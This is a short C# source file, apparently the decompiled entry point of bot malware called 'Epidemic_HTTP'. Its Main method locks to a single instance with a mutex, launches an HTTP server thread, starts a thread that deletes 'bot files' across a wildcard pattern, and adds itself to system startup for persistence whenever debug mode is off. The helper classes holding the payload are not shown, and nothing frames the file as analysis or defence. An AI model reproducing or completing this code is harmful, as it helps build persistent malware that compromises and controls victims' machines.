using System;
using System.Threading;

namespace Epidemic_HTTP;

internal class Epidemic
{
	private static bool notRunning;

	public static Mutex appStartMutex = new Mutex(initiallyOwned: true, Config.mutex, out notRunning);

	private static void Main(string[] args)
	{
		if (!notRunning)
		{
			Environment.Exit(0);
		}
		HTTP @object = new HTTP(Config.http_dir);
		Thread thread = new Thread(@object.startHttp);
		thread.Start();
		Cleaner object2 = new Cleaner(null, "*");
		Thread thread2 = new Thread(object2.cleanBotFiles);
		thread2.Start();
		if (!Config.debug)
		{
			Startup object3 = new Startup();
			Thread thread3 = new Thread(object3.AddStartup);
			thread3.Start();
		}
	}
}
